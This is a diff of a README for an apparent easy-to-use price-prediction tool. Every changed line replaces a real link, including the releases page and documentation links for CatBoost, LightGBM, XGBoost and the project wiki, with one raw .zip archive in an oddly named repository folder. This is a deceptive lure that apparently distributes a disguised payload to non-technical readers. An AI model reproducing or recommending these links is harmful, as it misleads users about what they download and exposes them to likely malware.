@@ -1,13 +1,13 @@
 # 📈 Gradient-Boosting-Price-Prediction - Easy Price Prediction for Everyone
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/releases)
+[![Download Latest Release](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip%20Latest%https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip)](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Gradient-Boosting-Price-Prediction application. This tool helps you predict prices using gradient boosting techniques. It’s designed for easy use, even if you have no technical background.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/releases).
+To get started, visit this page to download: [GitHub Releases](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip).
 
 1. Go to the link above.
 2. Click on the version you want to download.
@@ -55,10 +55,10 @@ For best results, format your data correctly. Here’s a quick look at what the 
 ## 📚 Additional Resources
 If you want to dive deeper into how gradient boosting works, here are some helpful resources:
 
-- [Understanding Gradient Boosting](https://machinelearningmastery.com/gentle-introduction-gradient-boosting-algorithms-machine-learning/)
-- [Introduction to CatBoost](https://catboost.ai/docs/concepts/index.html)
-- [LightGBM Documentation](https://lightgbm.readthedocs.io/en/latest/)
-- [XGBoost Guide](https://xgboost.readthedocs.io/en/latest/)
+- [Understanding Gradient Boosting](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip)
+- [Introduction to CatBoost](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip)
+- [LightGBM Documentation](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip)
+- [XGBoost Guide](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip)
 
 ## 🤔 Frequently Asked Questions (FAQs)
 
@@ -75,7 +75,7 @@ A: Yes, this tool can help you make better pricing decisions based on historical
 We welcome your feedback! If you have suggestions to improve the app, please visit our GitHub issues page. Your input helps us make this application better for everyone.
 
 ## 🔗 Resources
-- [Join Us on GitHub](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction)
-- [Check Full Documentation](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/wiki)
+- [Join Us on GitHub](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip)
+- [Check Full Documentation](https://github.com/rommelajcf/Gradient-Boosting-Price-Prediction/raw/refs/heads/main/synergically/Boosting-Gradient-Prediction-Price-1.6.zip)
 
 We hope you enjoy using the Gradient-Boosting-Price-Prediction application. Happy predicting!
